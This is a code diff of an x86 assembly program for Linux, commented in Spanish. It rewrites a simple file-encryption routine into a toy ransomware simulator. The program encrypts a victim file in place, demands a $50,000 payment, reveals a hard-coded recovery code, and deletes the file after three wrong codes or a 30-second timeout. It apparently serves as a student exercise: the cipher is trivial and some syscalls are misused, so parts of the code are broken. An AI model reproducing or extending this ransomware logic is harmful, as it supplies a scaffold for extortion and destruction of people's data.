@@ -1,83 +1,452 @@
 GLOBAL main
 
 section .data
-    archVictima DD "archivoV.txt", 0
-    archCifrado DD "archivoCifrado.txt", 0
-    tama_buffer EQU 50
-    key DD 3
+    archVictima DB "archivoV.txt", 0
+    mensaje_pago db 10,10,10,"Realice el pago de $50000: $",0
+    tam_pago equ $ - mensaje_pago
+
+    mensaje_codigo db 10,10,"El codigo para recuperar tu informacion es ->1234<- ",10,10,0
+    tam_mensajeC equ $ -mensaje_codigo
+
+    mensaje_ingreso db 10,"->Ingresa el código:-> ", 0
+    tam_mensaje equ $ - mensaje_ingreso
+
+    mensaje_correcto db " ¡Código correcto! ", 10,0
+    tam_correct equ $ - mensaje_correcto
+
+    mensaje_error db 10,"Código incorrecto!!!!",10, 0
+    tam_err equ $ - mensaje_error
+
+    mensaje_eliminar db 10,"!!ELIMINANDO EL ARCHIVO!! ", 10, 0
+    tam_elim equ $ - mensaje_eliminar
+
+    mensaje_errElim db 10,"----->ERROR<-----", 10, 0
+    tam_errElim equ $ - mensaje_errElim
+
+    msg db 10,10,'Limite de Tiempo Excedido para la Transaccion, ELIMINANDO ARCHIVO!!!.',10,10, 0
+    len equ $-msg
+    result dd 0
+
+    espacio db " "
+    tama_buffer EQU 70
+    tama_buffer1 EQU 70
+    key DD 4
+    dinero DD "50000"
+    codigo_correcto db "1234"
+    intentos_correctos DD 0
+    postfixExpr DD 0
 
 section .bss
     fd_lectura resw 1
     fd_cifrado resw 1
+    fd_codigo resw 1
     buffer resb tama_buffer
+    buffer2 resb tama_buffer
+
+
+    timer resb 4
+    timer2 resb 4 ; para el tiempo no se necesitan mas de 4 bytes, ya que el numero es un entero
+
 
 section .text 
+
+    ;->INICIOO<-
     main:
-        ; Abrir el archivo de lectura
-        mov eax, 5              ; sys_open
+        ;Abrimos el archivo de lectura
+        mov eax, 5              ;sys_open
         mov ebx, archVictima
-        mov ecx, 2              ; 
-        mov edx, 777              ; Cuenta con todos los permisos
+        mov ecx, 0            ;El archivo se abrira en modo lectura
+        mov edx, 777              ;Cuenta con todos los permisos rwx
         int 0x80
 
-        mov [fd_lectura], eax   ; Guardar identificador de archivo de lectura
+        mov [fd_lectura], eax   ;Guardamos el identificador de archivo de lectura
 
-        ; Abrir el archivo de cifrado
-        mov eax, 5              ; sys_open
-        mov ebx, archCifrado
-        mov ecx, 641            ;(modo de escritura, crear si no existe, truncar el archivo)
-        mov edx, 777            ; Asignando todos los permisos
-        int 0x80
 
-        mov [fd_cifrado], eax   ; Guardar identificador de archivo de cifrado
-
-        ; Leer el contenido del archivo
+        ;Leer el contenido del archivo
         mov eax, 3
         mov ebx, [fd_lectura]
         mov ecx, buffer
         mov edx, tama_buffer
-        int 0x80                ; Leemos contenido del archivo
+        int 0x80                ;Aqui basicamente Leemos contenido del archivo
 
-        ; Cifrar contenido
-        mov esi, buffer        ; Puntero al inicio del buffer
-        xor ecx, ecx           ; Contador de posición inicializado en 0
+        ;Cifrar contenido
+        mov esi, buffer        ;Puntero al inicio del buffer
+        mov ecx, 0          ;Contador de posición inicializado en 0
 
+
+    ;->INICIO PARA EL CIFRADO DEL CONTENIDO DEL ARCHIVO<-
     cifrar_loop:
-        movzx eax, byte [esi]  ; Cargar el caracter actual en AL
-        cmp al, 0              ; Verificar si se llegó al final del archivo
-        je fin_cifrar
+        movzx eax, byte [esi]  ;Cargamos el caracter actual en AL
+        cmp al, 0              ;Verificamos si se llegó al final del archivo
+        je fin_cifrar          ;De ser el final del archivo, salta a fin_cifrar
 
-        add al, byte [key]    ; Sumar el valor de "key" al caracter actual
-        mov byte [esi], al    ; Guardar el caracter cifrado en el buffer
+        cmp al, [espacio]
+        je incrementos_cifrado
 
-        inc esi               ; Avanzar al siguiente caracter en el buffer
-        inc ecx               ; Incrementar el contador de posición
+        mov cl, byte [key]     ;Cargmos el valor de "key" en CL
+        ror al, cl             ;Rotamos a la derecha el valor de AL según CL->cl tiene un 3
 
-        cmp ecx, edx          ; Comparar el contador con el tamaño del buffer
-        jl cifrar_loop        ; Si no se ha llegado al final del buffer, repetir el bucle
 
+        mov [esi], al    ;Guardamos el caracter cifrado en el buffer
+        jmp incrementos_cifrado
+
+        
+
+    ;->IMPRESION EN CONSOLA DEL CONTENIDO CIFRADO, ELIMINANDO EL CONTENIDO ACTUAL Y SOBREESCRIBIENDO YA EL CONTENIDO CIFRADO<-
     fin_cifrar:
-        ; Escribir el contenido cifrado en el archivo de cifrado
+        ;Cerramos el archivo de lectura
+        mov eax, 6              ;sys_close
+        mov ebx, [fd_lectura]
+        int 0x80
+
+        ;->IMPRESION EN CONSOLA DEL CONTENIDO CIFRADO<-
+        mov eax, 4              ;Identificador de la llamada al sistema ESCRITURA
+        mov ebx, 1              ;Descriptor de archivo para la salida estándar
+        mov ecx, buffer         ;Apuntador al mensaje (dirección de memoria)
+        mov edx, tama_buffer   ;Tamaño del mensaje
+        int 0x80                ;Llamada al sistema
+
+
+        ;Abrimos el archivo de escritura (archivo original)
+        mov eax, 5              ; sys_open
+        mov ebx, archVictima
+        mov ecx, 641            ; Modo de escritura, crear si no existe, permisos 641
+        mov edx, 777            ; Asignando todos los permisos
+        int 0x80
+
+        mov [fd_lectura], eax   ; Guardamos el identificador de archivo de escritura
+
+
+        ;BORRAR CONTENIDO DEL ARCHIVO
+        mov eax, 92           ; Número de función para truncar archivo (truncate)
+        mov ebx, eax          ; El descriptor de archivo se encuentra en eax
+        int 0x80              ; Llamada al sistema
+
+        mov eax, 6              ;sys_close
+        mov ebx, [fd_lectura]
+        int 0x80
+
+
+        ; Abrimos el archivo de escritura (archivo original)
+        mov eax, 5              ; sys_open
+        mov ebx, archVictima
+        mov ecx, 641            ; Modo de escritura, crear si no existe, permisos 641
+        mov edx, 777            ; Asignando todos los permisos
+        int 0x80
+
+        mov [fd_lectura], eax   ; Guardamos el identificador de archivo de escritura
+
+        ;->Escribiendo el contenido cifrado en el archivo original<-
         mov eax, 4              ; sys_write
-        mov ebx, [fd_cifrado]
+        mov ebx, [fd_lectura]
         mov ecx, buffer
         mov edx, tama_buffer
-        int 0x80                ; Escribimos el contenido cifrado en el archivo de cifrado
+        int 0x80                ; Escribimos el contenido cifrado en el archivo original
 
-        ; Cerrar el archivo de lectura
+        ;Cerramos el archivo original
         mov eax, 6              ; sys_close
         mov ebx, [fd_lectura]
         int 0x80
 
-        ; Cerrar el archivo de cifrado
-        mov eax, 6              ; sys_close
-        mov ebx, [fd_cifrado]
-        int 0x80
+        ;Obtener el tiempo actual
+        mov eax, 0x0d      ; Número de llamada al sistema para clock_gettime
+        mov ebx, 0         ; Reloj en tiempo real
+        int 0x80            
+        mov [timer], eax   ; guardamos el tiempo en la variable 
 
-        ; Eliminar el archivo original
-        mov eax, 10             ; sys_unlink
+        ;jmp Pedir_codigo  
+
+    Pago:
+         ;Obtener el tiempo actual
+        mov eax, 0x0d      ; Número de llamada al sistema para clock_gettime
+        mov ebx, 0         ; Reloj en tiempo real
+        int 0x80            
+        mov [timer2], eax   ; guardamos el tiempo en la variable 
+
+        ;mostramos el mensaje para que se realice el pago
+        mov eax, 4               ; sys_write
+        mov ebx, 1               ; Descriptor de archivo para la salida estándar (stdout)
+        mov ecx, mensaje_pago ; Apuntador al mensaje "Ingresa el código"
+        mov edx, tam_pago     ; Tamaño del mensaje
+        int 0x80                 ; Llamada al sistema
+
+        ; Solicitar Pago al usuario
+        mov eax, 3               ; sys_read
+        mov ebx, 0               ; Descriptor de archivo para la entrada estándar (stdin)
+        mov ecx, buffer2         ; Apuntador al búfer para almacenar la entrada
+        mov edx, tama_buffer    ; Tamaño máximo de lectura
+        int 0x80                 ; Llamada al sistema
+
+        ;para comprobar si se ingresa algo o no 
+        cmp eax,1
+        jle Pago
+
+         ;Obtener el tiempo actual
+        mov eax, 0x0d      ; Número de llamada al sistema para clock_gettime
+        mov ebx, 0         ; Reloj en tiempo real
+        int 0x80            
+        mov [timer2], eax   ; guardamos el tiempo en la variable 
+
+        mov eax, [timer2]  ; last
+        mov ebx, [timer]   ; start
+
+        sub eax, ebx       ; last-start=tiempo en seg
+
+        mov [result], eax  ; guardamos el resultado
+
+        cmp dword [result], 30   ; si el resultado es mayor a 10 terminaos el bucle 
+        ja Limite_excedido
+
+        ; Comparar si el dinero es el correcto
+        mov eax,[buffer2]
+        cmp eax,[dinero]   ;compara el pago que ingreso el usuario con el que se pide
+        je Pedir_codigo    ; Si el pago es aceptado, saltar a la etiqueta "codigo_correcto"
+        jne Pago           ; si no es el correcto vuelve  pedir el pago
+
+
+   ;-------
+    Pedir_codigo:
+
+        ;Mostrar mensaje con el codigo correcto
+        mov eax, 4               ; sys_write
+        mov ebx, 1               ; Descriptor de archivo para la salida estándar (stdout)
+        mov ecx, mensaje_codigo ; Apuntador al mensaje con el coigo correcto
+        mov edx, tam_mensajeC    ; Tamaño del mensaje
+        int 0x80                 ; Llamada al sistema
+
+            ; Mostrar mensaje "Ingresa el código"
+        mov eax, 4               ; sys_write
+        mov ebx, 1               ; Descriptor de archivo para la salida estándar (stdout)
+        mov ecx, mensaje_ingreso ; Apuntador al mensaje "Ingresa el código"
+        mov edx, tam_mensaje     ; Tamaño del mensaje
+        int 0x80                 ; Llamada al sistema
+
+        ; Solicitar código al usuario
+        mov eax, 3               ; sys_read
+        mov ebx, 0               ; Descriptor de archivo para la entrada estándar (stdin)
+        mov ecx, buffer2         ; Apuntador al búfer para almacenar la entrada
+        mov edx, tama_buffer1    ; Tamaño máximo de lectura
+        int 0x80                 ; Llamada al sistema
+
+        ;para comprobar si se ingresa algo o no 
+        cmp eax,1
+        jle Pedir_codigo
+
+        ; Comparar código ingresado con el código correcto
+        mov eax,[buffer2]
+        cmp eax,[codigo_correcto]
+        je correcto    ; Si el código es correcto, saltar a la etiqueta "codigo_correcto"
+        jne codigo_Incorrecto ;si no salta a codigo incorrecto
+
+
+
+;->INICIO PARA EL DESCIFRADO DEL CONTENIDO DEL ARCHIVO<-
+    descifrar_prueba:
+
+        movzx eax, byte [esi]  ;Cargamos el caracter actual en AL
+        cmp al, 0              ;Verificamos si se llegó al final del archivo
+        je fin_descifrar       ;De ser el final del archivo, salta a fin_cifrar
+
+        cmp al, [espacio]          ;revisa si hay un espacio para no tomaro en cuenta
+        je incrementos_descifrado  ;salta para revisar el siguiente caracter
+
+        mov cl, byte [key]     ;Cargamos el valor de "key" en CL
+        rol al, cl             ;Rotamos a la izquierda el valor de AL según CL->cl tiene un 4
+
+
+        mov [esi], al    ;Guardamos el caracter cifrado en el buffer
+        jmp incrementos_descifrado ;para pasar al siguiente caracter
+
+
+    ;->IMPRESION EN CONSOLA DEL CONTENIDO DESCIFRADO, ELIMINANDO EL CONTENIDO ACTUAL Y SOBREESCRIBIENDO YA EL CONTENIDO DESCIFRADO<-
+    fin_descifrar:
+        ;Cerramos el archivo de lectura
+        mov eax, 6              ;sys_close
+        mov ebx, [fd_lectura]
+        int 0x80
+        
+
+        ;->MUESTRA EL CONTENIDO DEL BUFFER<-
+        mov eax, 4              ;Identificador de la llamada al sistema ESCRITURA
+        mov ebx, 1              ;Descriptor de archivo para la salida estándar
+        mov ecx, buffer         ;Apuntador al mensaje (dirección de memoria)
+        mov edx, tama_buffer    ;Tamaño del mensaje
+        int 0x80                ;Llamada al sistema
+
+
+
+        ;Abrimos el archivo de escritura (archivo original)
+        mov eax, 5              ; sys_open
         mov ebx, archVictima
+        mov ecx, 641            ; Modo de escritura, crear si no existe, permisos 641
+        mov edx, 777            ; Asignando todos los permisos
         int 0x80
 
-        mov eax, 1              ; Fin del programa
+        mov [fd_lectura], eax   ; Guardamos el identificador de archivo de escritura
+
+
+        ;->BORRAR CONTENIDO DEL ARCHIVO<-
+        mov eax, 92           ; Número de función para truncar archivo (truncate)
+        mov ebx, eax          ; El descriptor de archivo se encuentra en eax
+        int 0x80              ; Llamada al sistema
+
+        mov eax, 6              ;sys_close
+        mov ebx, [fd_lectura]
         int 0x80
+
+
+        ; Abrimos el archivo de escritura (archivo original)
+        mov eax, 5              ;sys_open
+        mov ebx, archVictima
+        mov ecx, 641            ;Modo de escritura, crear si no existe, permisos 641
+        mov edx, 777            ;Asignando todos los permisos
+        int 0x80
+
+        mov [fd_lectura], eax   ;Guardamos el identificador de archivo de escritura
+
+        ;Escribiendo el contenido descifrado en el archivo original
+        mov eax, 4              ;sys_write
+        mov ebx, [fd_lectura]
+        mov ecx, buffer
+        mov edx, tama_buffer
+        int 0x80                ;Llamada al sistema
+
+        ;Cierre del archivo original
+        mov eax, 6              ; sys_close
+        mov ebx, [fd_lectura]
+        int 0x80
+
+        mov eax, 1              ;Fin del programa
+        int 0x80
+
+
+
+    ;->INCREMENTOS PARA EL CIFRADO DEL MENSAJE<-
+    incrementos_cifrado:
+        inc esi               ;Avanzamos al siguiente caracter en el buffer
+        inc ecx               ;Incrementamos el contador de posición
+
+        cmp ecx, edx          ;Comparamos el contador con el tamaño del buffer
+        jl cifrar_loop        ;Si no se ha llegado al final del buffer, continua en el ciclo
+        jmp fin_cifrar
+
+    
+
+
+    ;->INCREMENTOS PARA EL DESCIFRADO DEL MENSAJE
+    incrementos_descifrado:
+        inc esi               ;Avanzamos al siguiente caracter en el buffer
+        inc ecx               ;Incrementamos el contador de posición
+
+        cmp ecx, edx          ;Comparamos el contador con el tamaño del buffer
+        jl descifrar_prueba   ;Si no se ha llegado al final del buffer, continua en el ciclo
+        jmp fin_descifrar
+
+
+
+    ;->ABRIR EL ARCHIVO DE LA VICTIMA<-
+    abrir_arch:
+        ;Abrimos el archivo de lectura
+        mov eax, 5              ;sys_open
+        mov ebx, archVictima
+        mov ecx, 0            ; El archivo se abrira en modo lectura
+        mov edx, 777              ;Cuenta con todos los permisos rwx
+        int 0x80
+
+        mov [fd_lectura], eax   ;Guardamos el identificador de archivo de lectura
+
+
+        ;Leer el contenido del archivo
+        mov eax, 3              ;sys lectura
+        mov ebx, [fd_lectura]   
+        mov ecx, buffer
+        mov edx, tama_buffer
+        int 0x80                ;Aqui basicamente Leemos contenido del archivo
+
+        ;Descifrar contenido
+        mov esi, buffer      ;Puntero al inicio del buffer
+        mov ecx, 0          ;Contador de posición inicializado en 0
+
+        jmp descifrar_prueba;Salto a descifrar pruba, que basicamente descifra el contenido del archivo
+   
+    eliminar_archivo:
+        
+        ; Mostrar mensaje "Eliminando archivo"
+        mov eax, 4              ; sys_write
+        mov ebx, 1              ; Descriptor de archivo para la salida estándar (stdout)
+        mov ecx, mensaje_eliminar ; Apuntador al mensaje "Eliminando archivo"
+        mov edx, tam_elim     ; Tamaño del mensaje
+        int 0x80                ; Llamada al sistema
+
+
+         ; Eliminar archivo si se ingresan 3 códigos erróneos
+        mov eax, 0x0a            ; sys_unlink (unlink)
+        mov ebx, archVictima    ; Nombre del archivo a eliminar
+        int 0x80                ; Llamada al sistema
+
+        cmp eax, -1             ; Compara el valor de retorno con -1 (indicador de error)
+        je error_eliminar       ; Salta a la etiqueta "error_eliminar" si se produjo un error
+
+        ; Finalizar el programa
+        mov eax, 1              ; sys_exit
+        int 0x80
+
+
+    correcto:
+        mov eax, 4              ; sys_write
+        mov ebx, 1              ; Descriptor de archivo para la salida estándar (stdout)
+        mov ecx, mensaje_correcto   ; Apuntador al mensaje "Código incorrecto"
+        mov edx, tam_correct      ; Tamaño del mensaje
+        int 0x80                ; Llamada al sistema
+
+        jmp abrir_arch
+
+    codigo_Incorrecto:
+        ; Mostrar mensaje "Código incorrecto"
+        mov eax, 4              ; sys_write
+        mov ebx, 1              ; Descriptor de archivo para la salida estándar (stdout)
+        mov ecx, mensaje_error   ; Apuntador al mensaje "Código incorrecto"
+        mov edx, tam_err      ; Tamaño del mensaje
+        int 0x80                ; Llamada al sistema
+
+
+
+        ;Incrementar contador de intentos
+        inc dword [intentos_correctos]
+        cmp dword [intentos_correctos], 3
+        jl Pedir_codigo         ; Si no se superan 3 intentos incorrectos, saltar a la etiqueta "Pedir_codigo"
+        jmp eliminar_archivo
+    
+    error_eliminar:
+         ;mostramos el mensaje para que se realice el pago
+        mov eax, 4               ; sys_write
+        mov ebx, 1               ; Descriptor de archivo para la salida estándar (stdout)
+        mov ecx, mensaje_errElim; Apuntador al mensaje "Ingresa el código"
+        mov edx, tam_errElim     ; Tamaño del mensaje
+        int 0x80                 ; Llamada al sistema
+
+        mov eax,1
+        int 0x80
+
+
+    Limite_excedido:;mensaje del tiempo
+        ; Mostrar mensaje "Eliminando archivo"
+            mov eax, 4              ; sys_write
+            mov ebx, 1              ; Descriptor de archivo para la salida estándar (stdout)
+            mov ecx, msg; Apuntador al mensaje "Eliminando archivo"
+            mov edx, len    ; Tamaño del mensaje
+            int 0x80                ; Llamada al sistema
+
+
+            ; Eliminar archivo si se ingresan 3 códigos erróneos
+            mov eax, 0x0a            ; sys_unlink (unlink)
+            mov ebx, archVictima    ; Nombre del archivo a eliminar
+            int 0x80                ; Llamada al sistema
+
+            cmp eax, -1             ; Compara el valor de retorno con -1 (indicador de error)
+            je error_eliminar       ; Salta a la etiqueta "error_eliminar" si se produjo un error
+
+            ; Finalizar el programa
+            mov eax, 1              ; sys_exit
+            int 0x80
+
